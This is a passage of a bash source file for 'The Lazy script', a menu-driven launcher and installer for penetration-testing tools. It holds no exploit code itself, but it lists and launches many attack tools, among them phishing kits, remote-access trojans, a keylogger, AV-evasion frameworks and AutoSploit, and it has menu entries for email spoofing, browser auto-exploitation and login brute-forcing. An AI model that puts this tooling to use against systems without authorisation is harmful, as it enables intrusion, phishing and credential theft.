#! /bin/bash

# set -x
VERSION=2.1.5
#Number of tools with keyboard shortcut support
HOWMANYTOOLS=53
BACKL="0"
DONATIONS=13
LATESTCHANGELOGLINES=26
cd
#############DEFAULTS###############
function defaults_l
{
#path for lscript
	LPATH="/root/lscript"
	export LPATH
#path for keyboard shortcuts
	KSPATH=""$LPATH"/ks"
	export KSPATH
#making sure the kspath is set
	if [[ ! -d "$KSPATH" ]]
	then
		mkdir "$KSPATH"
	fi
#wififb file
	wififbfile=""$LPATH"/wififb.txt"
	wififbfileall=""$LPATH"/wififball.txt"
	wififbpassfile=""$LPATH"/wififbpasswords.txt"
	wififbpassfileall=""$LPATH"/wififbpasswordsall.txt"
	export wififbfile 
	export wififbfileall
	export wififbpassfile
	export wififbpassfileall
#ALFA SUPPORT SETTING
	if [[ -f "$LPATH"/settings/AWUS036ACH.txt ]]
	then
		read ALFA < "$LPATH"/settings/AWUS036ACH.txt
	else
		ALFA="no"
	fi
#yellow start 
	YS="\e[1;33m"
#blue start 
	BS="\e[0;34m"
#color end
	CE="\e[0m"
#red start
	RS="\e[1;31m"
#black start
	BLS="\e[0;30m"
#dark gray start
	DGYS="\e[1;30m"
#light blue start
	LBS="\e[1;34m"
#green start
	GNS="\e[0;32m"
#light green start
	LGNS="\e[1;32m"
#cyan start
	CYS="\e[0;36m"
#light cyan start
	LCYS="\e[1;36m"
#light red start
	DRS="\e[0;31m"
#purple start
	PS="\e[0;35m"
#light purple start
	LPS="\e[1;35m"
#brown start
	BRS="\e[0;33m"
#light gray start
	LGYS="\e[0;37m"
#white start
	WHS="\e[1;37m"
#setting custom color for logo
	if [[ -f "$LPATH"/settings/logocolor.txt ]]
	then
		read COL < "$LPATH"/settings/logocolor.txt
	else
		COL="$RS"
	fi
#tools
toolarray=(
"fluxion" "sniffer" "wifite" "wifiphisher" "morpheus" "osrframework" "hakku" "trity" "cupp" "dracnmap" "fern" "kickthemout" "ghostphisher" "theeye" "xerxes"
"mdk3" "katana" "airgeddon" "4nonimizer" "beelogger" "ezsploit" "pupy" "zirikatu" "wifiautopwner" "bully" "anonsurf" "anonym8" "thefatrat" "angryip" "sniper"
"recondog" "redhawk" "winpayloads" "chaos" "routersploit" "infoga" "nwatch" "eternalscanner" "eaphammer" "dagon" "lalin" "knockmail" "kwetza" "ngrok" "netdiscover"
"websploit" "openvas" "shellter" "geany" "bleachbit" "vmr" "hashbuster" "findsploit" "howdoi" "operative" "netattack2" "koadic" "empire" "meterpreter_paranoid_mode"
"dropit_frmw" "wifi_pumpkin" "veil" "leviathan" "fake_image" "avet" "gloom" "arcanus" "msfpc" "morphhta" "lfi" "unibyav" "demiguise" "dkmc" "sechub" "beef" "mitmf"
"fsociety" "arp_scan" "netool" "sqlmap" "patator" "zeus" "evil_droid" "nosqlmap" "eggshell" "zerodoor" "cromos" "yuki-chan" "socialfish" "autosploit" "blazy"
"striker" "hyprpulse" "instaburst" "instagram-py" "datasploit" "sitebroker" "enigma"
)
#setting frequent stings
	YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
	YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
	YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
	PAKT="Press "$YS"any key$CE to"
	PAKTC="Press "$YS"any key$CE to continue..."
	PAKTGB="Press "$YS"any key$CE to go back..."
	TNI=""$RS"Tool is not installed. To install it type '"$CE""$YS"install"$CE""$RS"'."$CE""
#code to read from keyboard without return
	READAK="read -n 1"
#default MAC when starting monitor
	DEFMAC="00:11:22:33:44:55"
	
	wififb="wififb"
}
##############FUNCTIONS#############
function local_ips()
{
	iffile=""$LPATH"/iftemp.txt"
	#passing an interface if any
	LF="$1"
	GREPP=$(ifconfig)
	if [[ "$LF" = "" ]]
	then
		echo -e ""$BS"Local IPs"$CE": "
		TEST=$(echo "$GREPP" | grep "$ETH:")
		n=0
		if [[ $TEST != "" ]]
		then
			ifconfig "$ETH" > $iffile
			LOCALETH=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
			cho=$(is_it_an_ip $LOCALETH)
			if [[ "$cho" = 1 ]]
			then
				echo -e ""$ETH" = "$YS"$LOCALETH"$CE""
				n=1
			fi
		fi
		TEST=$(echo "$GREPP" | grep "$WLANN:")
		if [[ $TEST != "" ]]
		then
			ifconfig $WLANN > $iffile
			LOCALMA=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
			cho=$(is_it_an_ip $LOCALMA)
			if [[ "$cho" = 1 ]]
			then
				echo -e "$WLANN = "$YS"$LOCALMA"$CE""
				n=1
			fi
		fi
		TEST=$(echo "$GREPP" | grep "$WLANNM:")
		if [[ $TEST != "" ]]
		then
			ifconfig $WLANNM > $iffile
			LOCALMO=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
			cho=$(is_it_an_ip $LOCALMO)
			if [[ "$cho" = 1 ]]
			then
				echo -e "$WLANNM = "$YS"$LOCALMO"$CE""
				n=1
			fi
		fi
		if [[ "$n" = 0 ]]
		then
			echo -e ""$RS"No known interfaces found available"$CE""
		fi
		echo -e ""
		find_gateways
	else
		TEST=$(echo "$GREPP" | grep "$LF:")
		if [[ $TEST != "" ]]
		then
			ifconfig $LF > $iffile
			LOCALM=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
			cho=$(is_it_an_ip $LOCALM)
			if [[ "$cho" = 1 ]]
			then
				OUTPUT="$LOCALM"
				echo -e "$OUTPUT"
			fi
		fi
	fi
}
function give_ip_take_zero()
{
	#passing an ip
	GI1="$1"
	GI2="$2"
	if [[ "$GI1" = "" ]]
	then
		echo -e ""$RS"Error 7. No parameters passed"$CE""
		sleep 3
	else
		ip1=$(echo -e "$GI1" | cut -d '.' -f1)
		ip2=$(echo -e "$GI1" | cut -d '.' -f2)
		ip3=$(echo -e "$GI1" | cut -d '.' -f3)
		if [[ "$GI2" = "" ]]
		then
			OUTPUT=""$ip1"."$ip2"."$ip3".0"
		else
			OUTPUT=""$ip1"."$ip2"."$ip3"."
		fi
			echo "$OUTPUT"
	fi
}
function is_it_an_ip()
{
	IIA=$1
	IIAI=${#IIA}
	if [[ "$IIA" = "" ]]
	then
		echo -e ""$RS"Error 9. No parameteres passed"
		sleep 2
	else
		if [[ "$IIAI" -le 15 && "$IIAI" -ge 7 ]]
		then
			echo 1
		else
			echo 0
		fi
	fi
}
function latest_changelog
{
	clear
	printf '\033]2;LATEST CHANGELOG\a'
	echo -e ""$BS"Wellcome to version $VERSION"$CE""
	echo -e "What is included in this update: "
	cat "$LPATH"/Changelog | head -n $LATESTCHANGELOGLINES
	echo -e "$PAKTC"
	$READAK
}
function finish 
{
  echo -e ""$RS"Hard kill detected.."$CE""
}
function dash_calc
{
	
	size=${#TERMINALTITLE}
	calc=$(( 65-size ))
	calc=$(( calc/2 ))
	numcalc=1
	DASHESN="-"
	while [ $numcalc != $calc ]
	do
		DASHESN=""$DASHESN"-"
		numcalc=$(( numcalc+1 ))
	done
	echo -e "$DASHESN"$RS"$TERMINALTITLE"$CE"$DASHESN"
}
function managed_spaces
{
	size=${#WLANN}
	calc=$(( 11-size ))
	numcalc=1
	SPACESN=" "
	while [ $numcalc != $calc ]
	do
		SPACESN=""${SPACESN}" "
		numcalc=$(( numcalc+1 ))
	done
}
function monitor_spaces
{
	size=${#WLANNM}
	calc=$(( 11-size ))
	numcalc=1
	SPACESM=" "
	while [ $numcalc != $calc ]
	do
		SPACESM=""${SPACESM}" "
		numcalc=$(( numcalc+1 ))
	done
}
function check_wlans
{
	CC=$WLANN
	WLANCHECKING=$(ifconfig | grep "$WLANN" )
	#~ WLANCHECKING=$(ifconfig | awk -v c1="$CC" '$0 ~ c1 {print}')
	CC=$WLANNM
	WLANMCHECKING=$(ifconfig | grep "$WLANNM" )
	#~ WLANMCHECKING=$(ifconfig | awk -v c1="$CC" '$0 ~ c1 {print}')
}
function banner
{
	check_wlans
	echo -e ""
	echo -e "$COL         ██╗      █████╗ ███████╗██╗   ██╗$CE v$VERSION"
	echo -e "$COL         ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝$CE"
	echo -e "$COL         ██║     ███████║  ███╔╝  ╚████╔╝ $CE   by "$COL"ARIS MELACHROINOS$CE"
	echo -e "$COL         ██║     ██╔══██║ ███╔╝    ╚██╔╝  $CE"
	echo -e "$COL    The  ███████╗██║  ██║███████╗   ██║  script$CE"
	echo -e "$COL         ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   $CE"
	echo -e ""$YS"if"$CE") Ifconfig           "$YS"l"$CE") Local IPs & gateways "$RS"|"$CE"  "$YS"scan"$CE") Arp-scan network"
	if [[ "$WLANCHECKING" = "" ]]
	then
		echo -e ""$RS" 1"$CE") Enable "$RS"$WLANN"$CE"${SPACESN}"$RS"d1"$CE") Disable "$RS"$WLANN"$CE"${SPACESN}  "$RS"|"$CE" "$YS"start"$CE") Start monitor mode"
		echo -e ""$RS" 2"$CE") Enable "$RS"$WLANNM"$CE"${SPACESM}"$RS"d2"$CE") Disable "$RS"$WLANNM"$CE"${SPACESM}  "$RS"|"$CE"  "$YS"stop"$CE") Stop monitor mode"
	else
		echo -e ""$YS" 1"$CE") Enable $WLANN${SPACESN}"$YS"d1"$CE") Disable $WLANN${SPACESN}  "$RS"|"$CE" "$YS"start"$CE") Start monitor mode"
		echo -e ""$YS" 2"$CE") Enable $WLANNM${SPACESM}"$YS"d2"$CE") Disable $WLANNM${SPACESM}  "$RS"|"$CE"  "$YS"stop"$CE") Stop monitor mode"
	fi
	echo -e ""$YS" 3"$CE") Change MAC        "$YS"d3"$CE") Restore original MAC "$RS"|"$CE""$YS"update"$CE") Check for updates"
	if [[ -f /usr/bin/anonym8 ]]
	then
	echo -e ""$YS" 4"$CE") Enable anonym8    "$YS"d4"$CE") Disable anonym8      "$RS"|"$CE""$YS"errors"$CE") Fix some errors"
	else
	echo -e ""$RS" 4"$CE") Enable anonym8    "$RS"d4"$CE") Disable anonym8      "$RS"|"$CE""$YS"errors"$CE") Fix some errors"
	fi
	if [[ -f /usr/bin/anonsurf ]]
	then
	echo -e ""$YS" 5"$CE") Enable anonsurf   "$YS"d5"$CE") Disable anonsurf     "$RS"|"$CE"    "$YS"ks"$CE") Keyboard shortucts"
	echo -e ""$YS" 6"$CE") Anonsurf's status "$YS"d6"$CE") Restart anonsurf     "$RS"|"$CE""$YS"     d"$CE") Buy me a coffee"
	else
	echo -e ""$RS" 5"$CE") Enable anonsurf   "$RS"d5"$CE") Disable anonsurf     "$RS"|"$CE"    "$YS"ks"$CE") Keyboard shortucts"
	echo -e ""$RS" 6"$CE") Anonsurf's status "$RS"d6"$CE") Restart anonsurf     "$RS"|"$CE"     "$YS"d"$CE") Buy me a coffee"
	fi
	echo -e ""$YS" 7"$CE") View public IP                             "$RS"|"$CE"     "$YS"s"$CE") Go to settings menu"
	echo -e ""$YS" 8"$CE") View MAC"
	echo -e ""$YS" 9"$CE") TOOLS             "$YS"15"$CE") Spoof EMAIL           "$YS"22"$CE") Show bandwidth"
	if [[ -f /root/ngrok ]]
	then
		echo -e ""$YS"10"$CE") Handshake         "$YS"16"$CE") Ngrok port forward"
	else
		echo -e ""$YS"10"$CE") Handshake         "$RS"16"$CE") "$RS"Ngrok"$CE" port forward"
	fi
	if [[ -f /usr/local/bin/howdoi ]]
	then
		echo -e ""$YS"11"$CE") Find WPS pin      "$YS"17"$CE") Ask (Howdoi tool)"
	else
		echo -e ""$YS"11"$CE") Find WPS pin      "$RS"17"$CE") Ask ("$RS"Howdoi"$CE" tool)"
	fi
	echo -e ""$YS"12"$CE") WEP menu          "$YS"18"$CE") Auto-exploit browser"
	echo -e ""$YS"13"$CE") MITM              "$YS"19"$CE") Geolocate an IP"
	echo -e ""$YS"14"$CE") Metasploit        "$YS"20"$CE") Bruteforce login"   
	echo -e ""$YS" 0"$CE") Exit              "$YS"21"$CE") Sqlmap automated"
	echo "Choose: "
	read -e YORNAA
	#~ echo "$YORNNA"
	#~ history -s "$YORNNA"
	clear
}
function enable_wlan
{
	O4=0
	echo -e "Enabling $WLANN..."
	rfkill unblock wifi &> /dev/null; rfkill unblock all &> /dev/null
	ifconfig $WLANN up &>/dev/null && echo -e ""$YS"Done"$CE"" && O4=1  || echo -e ""$RS"Error. I can't find your wireless adapter"$CE""
}
function disable_wlan
{
	echo -e "Disabling $WLANN..."
	rfkill unblock wifi &> /dev/null; rfkill unblock all &> /dev/null
	ifconfig $WLANN down &>/dev/null && echo -e ""$YS"Done"$CE"" && O4=1 || echo -e ""$RS"Error. I can't find your wireless adapter."$CE""
}
function interface_selection
{
if [[ "$WLANCHECKING" = "" ]]
then
	echo -e ""$RS" 1"$CE") $WLANN"
else
	echo -e ""$YS" 1"$CE") $WLANN"
fi
if [[ "$WLANMCHECKING" = "" ]]
then
	echo -e ""$RS" 2"$CE") $WLANNM"
else
	echo -e ""$YS" 2"$CE") $WLANNM"
fi
echo -e ""$YS" 3"$CE") "$ETH""
echo -e ""$YS" b"$CE") Main menu"
echo -e ""$YS" 0"$CE") EXIT"
echo -e "Choose: "
read -e MYINT
if [[ "$MYINT" = "2" ]]
then
	if [[ "$WLANMCHECKING" = "" ]]
	then
		MYINT="OFF"
	else
		MYINT="$WLANNM"
	fi
elif [[ "$MYINT" = "1" ]]
then
	if [[ "$WLANCHECKING" = "" ]]
	then
		MYINT="OFF"
	else
		MYINT="$WLANN"
	fi
elif [[ "$MYINT" = "0" ]]
then
	clear
	exit
elif [[ "$MYINT" = "00" || "$MYINT" = "b" ]]
then
	exec bash "$0"
elif [[ "$MYINT" = "3" ]]
then
	MYINT="$ETH"
else
echo -e "Wrong choice..."
sleep 2
clear
echo -e "EXITING"
sleep 1
exec bash "$0"
fi
export MYINT
}
function change_mac
{
	interface_selection
	clear
	if [[ "$MYINT" = "OFF" ]]
	then
		echo -e "Interface not available"
		sleep 2
	else
		echo -e "Change it to a random or specific?("$YS"r"$CE"/"$YS"s"$CE")("$YS"Enter"$CE"=r): "
		read -e RORS
		clear
		if [[ "$RORS" != "s" ]]
		then
			echo -e "Changing mac address of $MYINT to a random one..."
			ifconfig $MYINT down
			macchanger -r $MYINT
			ifconfig $MYINT up
			echo -e "Done."
		else
			echo -e "Enter the MAC you want:"
			read -e SMAC
			echo -e "Changing mac address of $MYINT to $SMAC..."
			ifconfig $MYINT down
			macchanger -m $SMAC $MYINT
			ifconfig $MYINT up
			echo -e "Done."
		fi
	fi
}
function set_interface_number
{
clear
while true
do
echo -e "Enter the name of your wireless interface when in "$RS"managed"$CE" mode("$YS"Enter"$CE"=wlan0): "
read MANAGED
if [[ "$MANAGED" = "" ]]
then
	MANAGED="wlan0"
fi
echo -e "Enter the name of your wireless interface when in "$RS"monitor"$CE" mode("$YS"Enter"$CE"=wlan0mon): "
read MONITOR
if [[ "$MONITOR" = "" ]]
then
	MONITOR="wlan0mon"
fi
echo -e "Enter the name of your wired interface("$YS"Enter"$CE"="eth0"): "
read WIRED
if [[ "$WIRED" = "" ]]
then
	WIRED="eth0"
fi
	echo "$MANAGED" > "$LPATH"/wlan.txt
	echo "$MONITOR" > "$LPATH"/wlanmon.txt
	echo "$WIRED" > "$LPATH"/eth.txt
	echo -e ""$YS"Done"$CE""
	sleep 1
	clear
	echo -e ""$BS"If you want to change it, type "$CE""$YS"interface"$CE""$BS" any time"$CE""
	sleep 3
	echo -e "$PAKTC"
	$READAK	
	BACKL="1"
	break
done
}
function checkifalready
{
	GOOD="1"
	num=1
	while [ $num -le 20 ]
	do
		if [[ "$CHECKKS" = "$num" ]]
		then
			GOOD="0"
			echo -e ""$RS"This shortcut is already in use by the script."$CE""
			sleep 3
		fi
		num=$(( num+1 ))
	done
	if [[ "$GOOD" = "1" ]]
	then
		if [[ "$CHECKKS" = "etercheck" || "$CHECKKS" = "eternalblue" || "$CHECKKS" = "changelog" || "$CHECKKS" = "wififb" || "$CHECKKS" = "nessusstop" || "$CHECKKS" = "nessusstart" || "$CHECKKS" = "pstop" || "$CHECKKS" = "pstart" || "$CHECKKS" = "astop" || "$CHECKKS" = "astart" || "$CHECKKS" = "settings" || "$CHECKKS" = "donate" || "$CHECKKS" = "d" || "$CHECKKS" = "s" || "$CHECKKS" = "g" || "$CHECKKS" = "l" || "$CHECKKS" = "" || "$CHECKKS" = "if" || "$CHECKKS" = "ifconfig" || "$CHECKKS" = "interfaces" || "$CHECKKS" = "interface" || "$CHECKKS" = "errors" || "$CHECKKS" = "00" || "$CHECKKS" = "exit" || "$CHECKKS" = "update" || "$CHECKKS" = "d1" || "$CHECKKS" = "d2" || "$CHECKKS" = "d3" || "$CHECKKS" = "d4" || "$CHECKKS" = "d5" || "$CHECKKS" = "d6" || "$CHECKKS" = "d7" || "$CHECKKS" = "gg" || "$CHECKKS" = "ks" ]]
		then
			GOOD="0"
			echo -e ""$RS"This shortcut is already in use by the script."$CE""
			sleep 3
		fi
	fi
	if [[ "$CHECKKS" = "delete" ]]
	then
		GOOD="0"
	fi
	#~ if [[ "$CHECKKS" = "b" || "$CHECKKS" = "back" ]]
	#~ then
		#~ GOOD="0"
	#~ fi
	if [[ "$GOOD" = "1" ]]
	then
		BACKUPTITLE="$TITLE"
		BACKUPNN="$nn"
		num=1
		while [[ $num -le "$HOWMANYTOOLS" ]]
		do
		nn="$num"
		listshortcuts
		if [[ -f ""$KSPATH"/"$TITLE"/"$TITLE"ks.txt" ]]
		then
			read KSIFALREADY < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
			if [[ "$CHECKKS" == "$KSIFALREADY" ]]
			then
				echo -e ""$RS"Shortcut '"$CHECKKS"' is already in use by "$TITLE""$CE""
				GOOD=0
				sleep 3
			fi
		fi
		num=$(( num+1 ))
		done
		nn="$BACKUPNN"
		TITLE="$BACKUPTITLE"
	fi
	clear
}	
function createshortcut
{
if [[ ! -d ""$KSPATH"/$TITLE" ]]
then
	mkdir "$KSPATH"/"$TITLE"
fi
clear
echo -e "Enter the keyboard shortcut that will open "$TITLE" from lscript's main menu"
echo -e "(e.g: "$YS""$TITLE""$CE")"
echo -e "To delete it , type:   "$YS"delete"$CE""
echo -e ""$YS" b"$CE") Go back"
read CHECKKS
if [[ "$CHECKKS" = "back" || "$CHECKKS" = "b" ]]
then
	clear
	BACKKS=1
	break
else
	BACKKS=0
	if [[ "$BACKKS" == 0 ]]
	then
		CHECKKSBACKUP="$CHECKKS"
		NAMECDBACKUP="$NAMECD"
		KSSETBACKUP="$KSSET"
		checkifalready
		CHECKKS="$CHECKKSBACKUP"
		NAMECD="$NAMECDBACKUP"
		KSSET="$KSSETBACKUP"
		if [[ "$GOOD" = "1" ]]
		then
			echo -e "Shortcut is ok.Setting it up..."
			sleep 1
			echo "$CHECKKS" > "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
			echo "$NAMECD" > "$KSPATH"/"$TITLE"/"$TITLE".txt
			echo "$KSSET" > "$KSPATH"/"$TITLE"/"$TITLE"2.txt
			echo -e "Done!"
			echo -e "$PAKTGB"
			$READAK
			clear
			#break
		else
			clear
			echo -e "Removing shortcut for "$TITLE"..."
			rm -r "$KSPATH"/"$TITLE"
			sleep 1
			echo -e "Done."
			echo -e "$PAKTGB"
			$READAK
			clear
			#break
		fi
	else
		break
	fi
fi
}
function listshortcuts
{	
	EXTRA1=""
	if [[ "$nn" = "1" ]]
	then
		TITLE="Fluxion"
		NAMECD="cd /root/fluxion"
		KSSET="./fluxion*"
	elif [[ "$nn" = "2" ]]
	then
		TITLE="Zirikatu"
		NAMECD="cd /root/zirikatu"
		KSSET="./zirikatu.sh"
	elif [[ "$nn" = "3" ]]
	then
		TITLE="Wifite"
		NAMECD=""
		KSSET="wifite"
	elif [[ "$nn" = "4" ]]
	then
		TITLE="Wifiphisher"
		NAMECD=""
		KSSET="wifiphisher"
	elif [[ "$nn" = "5" ]]
	then
		TITLE="Zatacker"
		NAMECD="cd /root/Zatacker"
		KSSET="./ZT.sh"
	elif [[ "$nn" = "6" ]]
	then
		TITLE="Morpheus"
		NAMECD="cd /root/morpheus"
		KSSET="./morpheus.sh"
	elif [[ "$nn" = "7" ]]
	then
		TITLE="Hakku"
		NAMECD="cd /root/hakkuframework"
		KSSET="./hakku"
	elif [[ "$nn" = "8" ]]
	then
		TITLE="Trity"
		NAMECD=""
		KSSET="trity"
	elif [[ "$nn" = "9" ]]
	then
		TITLE="Cupp"
		NAMECD="cd /root/cupp"
		KSSET="python cupp.py -i"
	elif [[ "$nn" = "10" ]]
	then
		TITLE="Dracnmap"
		NAMECD="cd /root/Dracnmap"
		KSSET="./dracnmap-v*.sh"
	elif [[ "$nn" = "11" ]]
	then
		TITLE="Fern"
		NAMECD=""
		KSSET="fern-wifi-cracker"
	elif [[ "$nn" = "12" ]]
	then
		TITLE="KickThemOut"
		NAMECD="cd /root/kickthemout"
		KSSET="python kickthemout.py"
	elif [[ "$nn" = "13" ]]
	then
		TITLE="Ghost-Phisher"
		NAMECD=""
		KSSET="ghost-phisher"
	elif [[ "$nn" = "14" ]]
	then
		TITLE="Xerxes"
		NAMECD="cd /root/xerxes"
		KSSET="./xerxes"
	elif [[ "$nn" = "15" ]]
	then
		TITLE="Katana"
		NAMECD=""
		KSSET="ktf.console"
	elif [[ "$nn" = "16" ]]
	then
		TITLE="Airgeddon"
		NAMECD="cd /root/airgeddon"
		KSSET="./airgeddon.sh"
	elif [[ "$nn" = "17" ]]
	then
		TITLE="Websploit"
		NAMECD=""
		KSSET="websploit"
	elif [[ "$nn" = "18" ]]
	then
		TITLE="BeeLogger"
		NAMECD="cd /root/BeeLogger"
		KSSET="python bee.py"
	elif [[ "$nn" = "19" ]]
	then
		TITLE="Ezsploit"
		NAMECD="cd /root/exsploit"
		KSSET="./ezsploit.sh"
	elif [[ "$nn" = "20" ]]
	then
		TITLE="Pupy"
		NAMECD="cd /root/pupy/pupy"
		KSSET="./pupysh.py"
	elif [[ "$nn" = "21" ]]
	then
		TITLE="TheFatRat"
		NAMECD="cd /root/TheFatRat"
		KSSET="./fatrat"
	elif [[ "$nn" = "22" ]]
	then
		TITLE="Angry_IP_Scanner"
		NAMECD=" "
		KSSET="ipscan"
	#~ elif [[ "$nn" = "23" ]]
	#~ then
		#~ TITLE="Sniper"
		#~ NAMECD='read -p 'DOMAIN:' DOMAIN'
		#~ KSSET="sniper $DOMAIN"
	elif [[ "$nn" = "23" ]]
	then
		TITLE="ReconDog"
		NAMECD="cd /root/ReconDog"
		KSSET="python dog.py"
	elif [[ "$nn" = "24" ]]
	then
		TITLE="RED_HAWK"
		NAMECD="cd /root/RED_HAWK"
		KSSET="php rhawk.php"
	elif [[ "$nn" = "25" ]]
	then
		TITLE="Winpayloads"
		NAMECD="cd /root/Winpayloads"
		KSSET="./WinPayloads.py"
	elif [[ "$nn" = "26" ]]
	then
		TITLE="CHAOS"
		NAMECD="cd /root/CHAOS"
		KSSET="go run CHAOS.go"
	elif [[ "$nn" = "27" ]]
	then
		TITLE="Routersploit"
		NAMECD="cd /root/routersploit"
		KSSET="./rsf.py"
	elif [[ "$nn" = "28" ]]
	then
		TITLE="nWatch"
		NAMECD="cd /root/nWatch"
		KSSET="python nwatch.py"
	elif [[ "$nn" = "29" ]]
	then
		TITLE="Eternal_scanner"
		NAMECD="cd /root/eternal_scanner"
		KSSET="./escan"
	elif [[ "$nn" = "30" ]]
	then
		TITLE="LALIN"
		NAMECD="cd /root/LALIN"
		KSSET="./Lalin.sh"
	elif [[ "$nn" = "31" ]]
	then
		TITLE="Shellter"
		NAMECD=""
		KSSET="shellter"
	elif [[ "$nn" = "32" ]]
	then
		TITLE="Netattack2"
		NAMECD="cd /root/netattack2"
		KSSET="python2 netattack2.py"
	elif [[ "$nn" = "33" ]]
	then
		TITLE="Operative-framework"
		NAMECD="cd /root/operative-framework"
		KSSET="python operative.py"
	elif [[ "$nn" = "34" ]]
	then
		TITLE="Koadic"
		NAMECD="cd /root/koadic"
		KSSET="./koadic"
	elif [[ "$nn" = "35" ]]
	then
		TITLE="Empire"
		NAMECD="cd /root/Empire"
		KSSET="./empire"
	elif [[ "$nn" = "36" ]]
	then
		TITLE="Meterpreter_Paranoid_Mode"
		NAMECD="cd /root/Meterpreter_Paranoid_Mode-SSL"
		KSSET="./Meterpreter_Paranoid_Mode.sh"
	elif [[ "$nn" = "37" ]]
	then
		TITLE="Wifi-Pumpkin"
		NAMECD=""
		KSSET="wifi-pumpkin"
	elif [[ "$nn" = "38" ]]
	then
		TITLE="Veil"
		NAMECD="cd /root/Veil"
		KSSET="./Veil.py"
	elif [[ "$nn" = "39" ]]
	then
		TITLE="Leviathan"
		NAMECD="cd /root/leviathan"
		KSSET="python leviathan.py"
	elif [[ "$nn" = "40" ]]
	then
		TITLE="Gloom-Framework"
		NAMECD="cd /root/Gloom-Framework"
		KSSET="python gloom.py"
	elif [[ "$nn" = "41" ]]
	then
		TITLE="Arcanus"
		NAMECD="cd /root/ARCANUS"
		KSSET="./ARCANUS"
	elif [[ "$nn" = "42" ]]
	then
		TITLE="LFISuite"
		NAMECD="cd /root/LFISuite"
		KSSET="python lfisuite.py"
	elif [[ "$nn" = "43" ]]
	then
		TITLE="DKMC"
		NAMECD="cd /root/DKMC"
		KSSET="python dkmc.py"
	elif [[ "$nn" = "44" ]]
	then
		TITLE="SecHub"
		NAMECD=""
		KSSET="sechub"
	elif [[ "$nn" = "45" ]]
	then
		TITLE="Beef-xss"
		NAMECD="cd /usr/share/beef-xss"
		KSSET="./beef"
	elif [[ "$nn" = "46" ]]
	then
		TITLE="Evil-Droid"
		NAMECD="cd /root/Evil-Droid"
		KSSET="./evil-droid"
	elif [[ "$nn" = "47" ]]
	then
		TITLE="NoSQLMap"
		NAMECD="cd /root/NoSQLMap"
		KSSET="python nosqlmap.py"
	elif [[ "$nn" = "48" ]]
	then
		TITLE="EggShell"
		NAMECD="cd /root/EggShell"
		KSSET="python eggshell.py"
	elif [[ "$nn" = "49" ]]
	then
		TITLE="Zerodoor"
		NAMECD="cd /root/Zerodoor"
		KSSET="python zerodoor.py"
	elif [[ "$nn" = "50" ]]
	then
		TITLE="AutoSploit"
		NAMECD="cd /root/AutoSploit"
		KSSET="python autosploit.py"
	elif [[ "$nn" = "51" ]]
	then
		TITLE="Enigma"
		NAMECD="cd /root/Enigma"
		KSSET="python enigma.py"
	elif [[ "$nn" = "52" ]]
	then
		TITLE="SocialFish"
		NAMECD="cd /root/SocialFish"
		KSSET="python SocialFish.py"
	elif [[ "$nn" = "53" ]]
	then
		TITLE="Yuki-Chan-The-Auto-Pentest"
		NAMECD="cd /root/Yuki-Chan-The-Auto-Pentest"
		KSSET="./yuki.sh"
	fi
}
function reinstall_tools
{
while true
do
	clear
		#counting the tools
	TOOLSNUM=${#toolarray[@]}
	HALFTOOLS=$((TOOLSNUM/2+1))
		#number for 2ond column
	CLMN2=$((HALFTOOLS+1))
	CLMN2TOOLS=$((TOOLSNUM/2+1))
		#alphabetically sort tools
	readarray -t toolarraysorted < <(for a in "${toolarray[@]}"; do echo "$a"; done | sort)
	echo -e ""$BS"Select out of $TOOLSNUM tools to install/update:"$CE""
		#set colour of selected
	SEL="$YS"
	n=0
	while [[ "$n" -lt "$HALFTOOLS" ]]
	do
			#start echoing from number 1 instead of number 0(fist array)
		k=$((n+1))
			#fixing the spaces to sort output better
		if [[ "$k" -le 9 ]]
		then
			m="  "$k""
		elif [[ "$k" -ge 10 && "$k" -le 99 ]]
		then
			m=" "$k""
		else
			m="$k"
		fi
			#calculating how many spaces needed for correct output
		size=${#toolarraysorted["$n"]}
		calc=$(( 35-size ))
		numcalc=1
		SPACES=""
		while [[ "$numcalc" != "$calc" ]]
		do
			SPACES=""${SPACES}" "
			numcalc=$(( numcalc+1 ))
		done
		COL1=""
		COL2=""
		if [[ "${selected["$n"]}" == 1 ]]
		then
			COL1="$SEL"
		fi
		if [[ "${selected["$CLMN2TOOLS"]}" == 1 ]]
		then
			COL2="$SEL"
		fi
		if [[ "${toolarraysorted["$CLMN2TOOLS"]}" == "" ]]
		then
			echo -e ""$YS"${m}"$CE") "$COL1""${toolarraysorted["$n"]}""$CE""
		else
			echo -e ""$YS"${m}"$CE") "$COL1""${toolarraysorted["$n"]}""$CE"${SPACES}"$YS""$CLMN2""$CE") "$COL2""${toolarraysorted["$CLMN2TOOLS"]}""$CE""
		fi
		n=$((n+1))
		CLMN2=$((CLMN2+1))
		CLMN2TOOLS=$((CLMN2TOOLS+1))
	done
	echo -e "  "$YS"b"$CE") Go back"
	echo -e "  "$YS"s"$CE") Start installing selected tools"
	echo -e "  "$YS"r"$CE") Reset selection"
	if [[ "$NOCONFIRM" == 1 ]]
	then
		echo -e "  "$YS"n"$CE") "$YS"No confirmation"$CE""
	else
		echo -e "  "$YS"n"$CE") No confirmation"
	fi
	echo -e "  "$YS"0"$CE") Exit"
	echo -e "  Choose: "
	read ST
	if [[ "$ST" == "b" || "$ST" == "back" ]]
	then
		clear
		break
	elif [[ "$ST" == 0 ]]
	then
		exit
	elif [[ "$ST" == 00 ]]
	then
		exec bash $0
	elif [[ "$ST" == "r" ]]
	then
		p=0
		while [[ "$p" -le "$TOOLSNUM" ]]
		do
			selected["$p"]=0
			p=$((p+1))
		done
	elif [[ "$ST" == "s" ]]
	then
		z=0
		HOWMANYSELECTED=0
		while [[ "$z" -lt "$TOOLSNUM" ]]
		do
			if [[ ${selected["$z"]} == 1 ]]
			then
				HOWMANYSELECTED=$((HOWMANYSELECTED+1))
				toolselected["$HOWMANYSELECTED"]=${toolarraysorted["$z"]}
			fi
			z=$((z+1))
		done
